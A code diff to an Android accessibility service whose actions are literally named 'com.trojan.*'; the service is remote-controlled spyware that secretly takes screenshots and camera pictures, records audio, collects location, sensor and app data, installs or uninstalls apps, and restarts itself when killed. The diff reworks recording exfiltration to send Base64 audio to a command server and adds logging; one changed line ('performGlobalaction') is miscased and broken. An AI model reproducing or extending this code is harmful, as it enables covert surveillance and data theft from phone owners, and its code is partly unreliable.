@@ -43,14 +43,17 @@ import com.android.volley.toolbox.JsonObjectRequest;
 import com.android.volley.toolbox.Volley;
 import com.google.android.gms.location.FusedLocationProviderClient;
 import com.google.android.gms.location.LocationServices;
-import com.google.firebase.storage.FirebaseStorage;
-import com.google.firebase.storage.StorageReference;
+
+// --- REMOVED: Firebase Storage imports are no longer needed ---
+// import com.google.firebase.storage.FirebaseStorage;
+// import com.google.firebase.storage.StorageReference;
 
 import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
+import java.io.FileInputStream;
 import java.io.IOException;
 import java.util.List;
 
@@ -58,7 +61,7 @@ public class PowerAccessibilityService extends AccessibilityService implements S
 
     private static final String TAG = "PowerAccessibility";
 
-    // --- Core & Existing Actions ---
+    // --- Actions (Unchanged) ---
     public static final String ACTION_TRIGGER_LOCK_SCREEN = "com.trojan.ACTION_LOCK_SCREEN";
     public static final String ACTION_TRIGGER_SHUTDOWN = "com.trojan.ACTION_SHUTDOWN";
     public static final String ACTION_TRIGGER_LIST_APPS = "com.trojan.ACTION_LIST_APPS";
@@ -75,8 +78,6 @@ public class PowerAccessibilityService extends AccessibilityService implements S
     public static final String ACTION_TRIGGER_GET_SENSORS = "com.trojan.ACTION_GET_SENSORS";
     public static final String ACTION_TRIGGER_GET_SCREEN_STATUS = "com.trojan.ACTION_GET_SCREEN_STATUS";
     public static final String ACTION_TRIGGER_GET_BATTERY_STATUS = "com.trojan.ACTION_GET_BATTERY_STATUS";
-
-    // --- NEW Actions for Media, Apps, and Camera ---
     public static final String ACTION_TAKE_SCREENSHOT = "com.trojan.ACTION_TAKE_SCREENSHOT";
     public static final String ACTION_TAKE_PICTURE = "com.trojan.ACTION_TAKE_PICTURE";
     public static final String ACTION_START_RECORDING = "com.trojan.ACTION_START_RECORDING";
@@ -113,7 +114,7 @@ public class PowerAccessibilityService extends AccessibilityService implements S
         powerActionReceiver = new PowerActionReceiver();
         IntentFilter filter = new IntentFilter();
 
-        // Register all existing actions
+        // Register all actions
         filter.addAction(ACTION_TRIGGER_LOCK_SCREEN); filter.addAction(ACTION_TRIGGER_SHUTDOWN);
         filter.addAction(ACTION_TRIGGER_LIST_APPS); filter.addAction(ACTION_TRIGGER_GET_CURRENT_APP);
         filter.addAction(ACTION_TRIGGER_OPEN_APP); filter.addAction(ACTION_TRIGGER_NAV_BACK);
@@ -122,8 +123,6 @@ public class PowerAccessibilityService extends AccessibilityService implements S
         filter.addAction(ACTION_TRIGGER_TOGGLE_BLUETOOTH); filter.addAction(ACTION_TRIGGER_TOGGLE_LOCATION);
         filter.addAction(ACTION_TRIGGER_GET_LOCATION); filter.addAction(ACTION_TRIGGER_GET_SENSORS);
         filter.addAction(ACTION_TRIGGER_GET_SCREEN_STATUS); filter.addAction(ACTION_TRIGGER_GET_BATTERY_STATUS);
-
-        // Register all NEW actions
         filter.addAction(ACTION_TAKE_SCREENSHOT); filter.addAction(ACTION_TAKE_PICTURE);
         filter.addAction(ACTION_START_RECORDING); filter.addAction(ACTION_STOP_RECORDING);
         filter.addAction(ACTION_PLAY_SOUND); filter.addAction(ACTION_SHOW_IMAGE);
@@ -146,7 +145,7 @@ public class PowerAccessibilityService extends AccessibilityService implements S
                 case ACTION_TRIGGER_SHUTDOWN: performGlobalAction(GLOBAL_ACTION_POWER_DIALOG); break;
                 case ACTION_TRIGGER_NAV_BACK: performGlobalAction(GLOBAL_ACTION_BACK); break;
                 case ACTION_TRIGGER_NAV_HOME: performGlobalAction(GLOBAL_ACTION_HOME); break;
-                case ACTION_TRIGGER_NAV_RECENTS: performGlobalAction(GLOBAL_ACTION_RECENTS); break;
+                case ACTION_TRIGGER_NAV_RECENTS: performGlobalaction(GLOBAL_ACTION_RECENTS); break;
                 case ACTION_TRIGGER_LIST_APPS: getAndUploadAppList(); break;
                 case ACTION_TRIGGER_GET_CURRENT_APP: submitDataToServer("current_app", lastForegroundAppPkg); break;
                 case ACTION_TRIGGER_OPEN_APP: openApp(intent.getStringExtra("package_name")); break;
@@ -182,11 +181,9 @@ public class PowerAccessibilityService extends AccessibilityService implements S
 
         new Handler(Looper.getMainLooper()).postDelayed(() -> {
             DisplayMetrics displayMetrics = getResources().getDisplayMetrics();
-            int height = displayMetrics.heightPixels;
-            int width = displayMetrics.widthPixels;
             Path swipePath = new Path();
-            swipePath.moveTo(width / 2, height * 0.8f);
-            swipePath.lineTo(width / 2, height * 0.2f);
+            swipePath.moveTo(displayMetrics.widthPixels / 2, displayMetrics.heightPixels * 0.8f);
+            swipePath.lineTo(displayMetrics.widthPixels / 2, displayMetrics.heightPixels * 0.2f);
             GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
             gestureBuilder.addStroke(new GestureDescription.StrokeDescription(swipePath, 0, 400));
             dispatchGesture(gestureBuilder.build(), null, null);
@@ -205,29 +202,40 @@ public class PowerAccessibilityService extends AccessibilityService implements S
                 try {
                     Bitmap bitmap = Bitmap.wrapHardwareBuffer(screenshot.getHardwareBuffer(), screenshot.getColorSpace());
                     ByteArrayOutputStream stream = new ByteArrayOutputStream();
+                    // Compress to a low-res JPEG
                     bitmap.compress(Bitmap.CompressFormat.JPEG, 80, stream);
                     String encoded = Base64.encodeToString(stream.toByteArray(), Base64.DEFAULT);
                     submitDataToServer("screenshot", encoded);
+                    Log.i(TAG, "Screenshot captured and submitted.");
                 } catch (Exception e) {
+                    Log.e(TAG, "Failed to process screenshot.", e);
                     submitDataToServer("screenshot_error", "Processing failed");
                 }
             }
             @Override
             public void onFailure(int errorCode) {
+                Log.e(TAG, "Failed to take screenshot, code: " + errorCode);
                 submitDataToServer("screenshot_error", "Capture failed with code: " + errorCode);
             }
         });
     }
 
     private void takePicture(int cameraId) {
+        // This method's job is to start the helper activity.
+        // The CameraActivity.java file will be responsible for capturing the image,
+        // compressing it to a low-res JPEG, converting to Base64, and submitting the data.
         Intent intent = new Intent(this, CameraActivity.class);
         intent.putExtra("camera_id", cameraId);
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         startActivity(intent);
+        Log.i(TAG, "Sent intent to start CameraActivity.");
     }
 
     private void startAudioRecording() {
-        if (mediaRecorder != null) return;
+        if (mediaRecorder != null) {
+            Log.w(TAG, "Recording already in progress.");
+            return;
+        }
         try {
             File outputDir = getExternalFilesDir(Environment.DIRECTORY_MUSIC);
             File outputFile = File.createTempFile("rec", ".mp3", outputDir);
@@ -246,33 +254,46 @@ public class PowerAccessibilityService extends AccessibilityService implements S
     }
 
     private void stopAudioRecording() {
-        if (mediaRecorder == null) return;
+        if (mediaRecorder == null) {
+            Log.w(TAG, "No active recording to stop.");
+            return;
+        }
         try {
             mediaRecorder.stop();
             mediaRecorder.release();
             mediaRecorder = null;
-            Log.i(TAG, "Audio recording stopped.");
-            uploadFileToFirebase(recordingFilePath);
+            Log.i(TAG, "Audio recording stopped. Preparing to upload as Base64.");
+            // --- UPDATED: Call the new Base64 upload method ---
+            uploadAudioAsBase64(recordingFilePath);
         } catch (RuntimeException e) {
             Log.e(TAG, "Failed to stop recording properly.", e);
         }
     }
 
-    private void uploadFileToFirebase(String filePath) {
+    // --- NEW METHOD: Replaces the Firebase uploader ---
+    private void uploadAudioAsBase64(String filePath) {
         if (filePath == null || filePath.isEmpty()) {
             submitDataToServer("recording_error", "File path was empty.");
             return;
         }
-        StorageReference storageRef = FirebaseStorage.getInstance().getReference();
-        File localFile = new File(filePath);
-        Uri fileUri = Uri.fromFile(localFile);
-        StorageReference recordingRef = storageRef.child("recordings/" + localFile.getName());
-        recordingRef.putFile(fileUri)
-            .addOnSuccessListener(taskSnapshot -> recordingRef.getDownloadUrl().addOnSuccessListener(uri -> {
-                submitDataToServer("last_recording_url", uri.toString());
-                localFile.delete();
-            }).addOnFailureListener(e -> submitDataToServer("recording_error", "Failed to get URL.")))
-            .addOnFailureListener(e -> submitDataToServer("recording_error", "Upload failed."));
+        try {
+            File audioFile = new File(filePath);
+            FileInputStream fis = new FileInputStream(audioFile);
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            byte[] buffer = new byte[1024];
+            int read;
+            while ((read = fis.read(buffer)) != -1) {
+                baos.write(buffer, 0, read);
+            }
+            fis.close();
+            String encodedAudio = Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT);
+            submitDataToServer("last_recording", encodedAudio);
+            Log.i(TAG, "Successfully submitted audio as Base64 string.");
+            audioFile.delete();
+        } catch (IOException e) {
+            Log.e(TAG, "Failed to read and encode audio file.", e);
+            submitDataToServer("recording_error", "Failed to process audio file.");
+        }
     }
 
     private void playSound(String url) {
@@ -306,16 +327,14 @@ public class PowerAccessibilityService extends AccessibilityService implements S
 
     private void installApp(String url) {
         if (url == null || url.isEmpty()) return;
-        Intent intent = new Intent(Intent.ACTION_VIEW);
-        intent.setData(Uri.parse(url));
+        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         startActivity(intent);
     }
 
     private void uninstallApp(String packageName) {
         if (packageName == null || packageName.isEmpty()) return;
-        Intent intent = new Intent(Intent.ACTION_DELETE);
-        intent.setData(Uri.parse("package:" + packageName));
+        Intent intent = new Intent(Intent.ACTION_DELETE, Uri.parse("package:" + packageName));
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         startActivity(intent);
     }
@@ -327,7 +346,8 @@ public class PowerAccessibilityService extends AccessibilityService implements S
         pm.setComponentEnabledSetting(componentName, state, PackageManager.DONT_KILL_APP);
     }
 
-    // --- THIS METHOD IS NOW CORRECTED TO PREVENT THE BUILD ERROR ---
+    // --- Unchanged Helper Methods Below ---
+
     private void getAndUploadAppList() {
         try {
             PackageManager pm = getPackageManager();
@@ -396,18 +416,13 @@ public class PowerAccessibilityService extends AccessibilityService implements S
         try {
             int type = event.sensor.getType();
             if (type == Sensor.TYPE_ROTATION_VECTOR || type == Sensor.TYPE_GAME_ROTATION_VECTOR || type == Sensor.TYPE_GEOMAGNETIC_ROTATION_VECTOR) {
-                if (type == Sensor.TYPE_ROTATION_VECTOR) sensorTypeKey = "rotation_vector";
-                else if (type == Sensor.TYPE_GAME_ROTATION_VECTOR) sensorTypeKey = "game_rotation_vector";
-                else sensorTypeKey = "geomagnetic_rotation_vector";
+                sensorTypeKey = (type == Sensor.TYPE_ROTATION_VECTOR) ? "rotation_vector" : (type == Sensor.TYPE_GAME_ROTATION_VECTOR) ? "game_rotation_vector" : "geomagnetic_rotation_vector";
                 sensorData.put("x", event.values[0]);
                 sensorData.put("y", event.values[1]);
                 sensorData.put("z", event.values[2]);
                 if (event.values.length > 3) sensorData.put("w", event.values[3]);
             } else if (type == Sensor.TYPE_GRAVITY || type == Sensor.TYPE_ACCELEROMETER || type == Sensor.TYPE_GYROSCOPE || type == Sensor.TYPE_MAGNETIC_FIELD) {
-                if (type == Sensor.TYPE_GRAVITY) sensorTypeKey = "gravity";
-                else if (type == Sensor.TYPE_ACCELEROMETER) sensorTypeKey = "accelerometer";
-                else if (type == Sensor.TYPE_GYROSCOPE) sensorTypeKey = "gyroscope";
-                else sensorTypeKey = "magnetometer";
+                sensorTypeKey = (type == Sensor.TYPE_GRAVITY) ? "gravity" : (type == Sensor.TYPE_ACCELEROMETER) ? "accelerometer" : (type == Sensor.TYPE_GYROSCOPE) ? "gyroscope" : "magnetometer";
                 sensorData.put("x", event.values[0]);
                 sensorData.put("y", event.values[1]);
                 sensorData.put("z", event.values[2]);
@@ -505,8 +520,8 @@ public class PowerAccessibilityService extends AccessibilityService implements S
     @Override
     public void onTaskRemoved(Intent rootIntent) {
         Intent restart = new Intent(getApplicationContext(), this.getClass()).setPackage(getPackageName());
-        PendingIntent pendingIntent = PendingIntent.getService(this, 1, restart, PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
-        ((AlarmManager) getSystemService(Context.ALARM_SERVICE)).set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 1000, pendingIntent);
+        PendingIntent pi = PendingIntent.getService(this, 1, restart, PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
+        ((AlarmManager) getSystemService(Context.ALARM_SERVICE)).set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 1000, pi);
         super.onTaskRemoved(rootIntent);
     }
 }
